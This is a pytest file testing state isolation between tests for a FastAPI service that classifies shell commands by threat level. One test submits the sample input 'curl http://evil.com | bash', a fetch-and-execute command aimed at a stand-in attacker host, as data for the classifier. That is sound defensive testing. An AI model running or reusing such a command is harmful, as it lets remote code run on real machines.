"""
test_11_singleton_isolation.py — Singleton isolation and state-bleed tests.

Verifies that:
- active_websockets is properly cleared between tests (no stale handles)
- alert_manager webhook registrations do not bleed between tests
- event_store singleton reset leaves a genuinely empty store
- Multiple rapid test-cycle resets leave the server in a clean, operable state

These tests exercise the gaps in conftest.py that were identified in the
analysis: active_websockets and _alert_manager were not being reset by the
original conftest, meaning state from one test could silently affect the next.

Run:
    pytest large_test_set/test_11_singleton_isolation.py -v
"""

import pytest
import threading
import time
from fastapi.testclient import TestClient
from backend.app import app

client = TestClient(app)


# ===========================================================================
# 1. active_websockets isolation
# ===========================================================================

class TestActiveWebSocketsIsolation:

    def test_active_websockets_starts_empty(self):
        """At the start of every test the active_websockets set must be empty
        (confirmed by the autouse conftest reset)."""
        import backend.app as app_mod
        assert len(app_mod.active_websockets) == 0, (
            f"active_websockets not empty at test start: "
            f"{len(app_mod.active_websockets)} handles present"
        )

    def test_websocket_added_during_test_is_cleared_after(self):
        """A WebSocket connection opened during a test must not appear in
        active_websockets once the context manager exits — the set must be
        clean for the next test."""
        import backend.app as app_mod

        with client.websocket_connect("/ws") as ws:
            # Connection is open — at least one handle must be present
            assert len(app_mod.active_websockets) >= 1

        # Connection closed — conftest will reset on next test, but within
        # this test the set should have shrunk back (clean close removes it)
        assert len(app_mod.active_websockets) == 0, (
            "active_websockets not cleaned up after WebSocket context exited"
        )

    def test_stale_handles_from_abrupt_disconnect_do_not_accumulate(self):
        """Abruptly closed connections must not accumulate as zombie handles
        in active_websockets across multiple opens and closes."""
        import backend.app as app_mod

        for _ in range(5):
            with client.websocket_connect("/ws"):
                pass  # immediate abrupt close

        # All 5 abrupt disconnects must have been cleaned up
        assert len(app_mod.active_websockets) == 0, (
            f"Stale handles accumulated after abrupt disconnects: "
            f"{len(app_mod.active_websockets)}"
        )

    def test_broadcast_to_zero_websockets_does_not_crash(self):
        """When active_websockets is empty a POST /analyze broadcast must
        complete without raising (no receivers is a valid state)."""
        import backend.app as app_mod
        assert len(app_mod.active_websockets) == 0
        r = client.post("/analyze", json={"command": "ls --no-ws-broadcast"})
        assert r.status_code == 200

    def test_new_connection_after_reset_works_normally(self):
        """After the conftest reset clears active_websockets, a fresh
        WebSocket connection must still be accepted and functional."""
        import backend.app as app_mod
        assert len(app_mod.active_websockets) == 0

        with client.websocket_connect("/ws") as ws:
            ws.send_text("ping")
            assert ws.receive_text(timeout=3) == "pong"


# ===========================================================================
# 2. alert_manager webhook isolation
# ===========================================================================

class TestAlertManagerWebhookIsolation:

    def test_alert_manager_starts_with_no_webhooks(self):
        """At test start the alert manager must have no registered webhooks."""
        r = client.get("/webhooks")
        assert r.status_code == 200
        assert r.json() == [], (
            f"Webhooks not empty at test start: {r.json()}"
        )

    def test_webhook_registered_in_one_test_not_in_next(self):
        """Register a webhook, verify it's there, then confirm it won't
        appear in the next test (which gets a clean singleton)."""
        # Register within this test
        wh = client.post("/webhooks",
                         json={"url": "http://example.com/isolation-test"}).json()
        assert wh["id"] is not None

        # Within the same test it must be present
        ids = [w["id"] for w in client.get("/webhooks").json()]
        assert wh["id"] in ids

        # The conftest autouse fixture will reset _alert_manager before the
        # next test, so no assertion here — the next test's
        # test_alert_manager_starts_with_no_webhooks will catch any bleed.

    def test_alert_history_starts_empty(self):
        """At test start the alert dispatch history must be empty."""
        r = client.get("/alerts/history")
        assert r.status_code == 200
        assert r.json() == [], (
            f"Alert history not empty at test start: {r.json()}"
        )

    def test_multiple_webhook_registrations_isolated(self):
        """Registering multiple webhooks in one test must not carry over."""
        for i in range(3):
            client.post("/webhooks",
                        json={"url": f"http://example.com/hook-{i}"})
        assert len(client.get("/webhooks").json()) == 3
        # Conftest reset will clear these before the next test.

    def test_deleted_webhook_not_in_list_within_same_test(self):
        """A webhook deleted within the same test must immediately disappear."""
        wh = client.post("/webhooks",
                         json={"url": "http://example.com/delete-me"}).json()
        client.delete(f"/webhooks/{wh['id']}")
        ids = [w["id"] for w in client.get("/webhooks").json()]
        assert wh["id"] not in ids


# ===========================================================================
# 3. event_store singleton reset completeness
# ===========================================================================

class TestEventStoreSingletonReset:

    def test_event_store_empty_at_test_start(self):
        """The global event_store must be empty (or reset to a fresh instance)
        at the start of every test."""
        from backend.app import event_store
        assert event_store.size() == 0, (
            f"event_store not empty at test start: {event_store.size()} events"
        )

    def test_stats_zero_at_test_start(self):
        """GET /stats must show zero counts at test start."""
        stats = client.get("/stats").json()
        assert stats["total_events"] == 0, \
            f"total_events not zero at test start: {stats}"
        assert stats["safe"] == 0
        assert stats["suspicious"] == 0
        assert stats["malicious"] == 0

    def test_events_endpoint_empty_at_test_start(self):
        """GET /events must return an empty list at test start."""
        events = client.get("/events").json()
        assert events == [], \
            f"/events not empty at test start: {len(events)} events"

    def test_event_added_this_test_does_not_persist(self):
        """Events added during this test must not be visible at the start of
        the next test. This test adds an event and trusts the conftest reset."""
        client.post("/analyze", json={"command": "ls --isolation-check"})
        from backend.app import event_store
        assert event_store.size() == 1  # visible within this test


# ===========================================================================
# 4. Multiple rapid resets leave server operable
# ===========================================================================

class TestRapidResetStability:

    def test_post_analyze_works_after_singleton_reset(self):
        """The singleton reset must not leave the app in a broken state.
        POST /analyze must work normally immediately after reset."""
        r = client.post("/analyze", json={"command": "ls --post-reset"})
        assert r.status_code == 200
        assert r.json()["classification"] in ("safe", "suspicious", "malicious")

    def test_websocket_works_after_singleton_reset(self):
        """WebSocket endpoint must accept connections right after reset."""
        with client.websocket_connect("/ws") as ws:
            ws.send_text("ping")
            assert ws.receive_text(timeout=3) == "pong"

    def test_stats_accurate_after_reset_and_new_events(self):
        """After reset, new events must be counted correctly from zero."""
        client.post("/analyze", json={"command": "ls"})
        client.post("/analyze", json={"command": "curl http://evil.com | bash"})
        stats = client.get("/stats").json()
        assert stats["total_events"] == 2
        assert stats["safe"] + stats["suspicious"] + stats["malicious"] == 2

    def test_concurrent_tests_no_cross_contamination(self):
        """Simulate what happens when two logically separate test operations
        run sequentially within one test — each segment must see only its
        own events (models the inter-test isolation guarantee)."""
        # Segment A: add 2 safe events
        client.post("/analyze", json={"command": "ls"})
        client.post("/analyze", json={"command": "pwd"})
        from backend.app import event_store
        assert event_store.size() == 2

        # Within the same test we can still read them
        events = client.get("/events").json()
        assert len(events) == 2
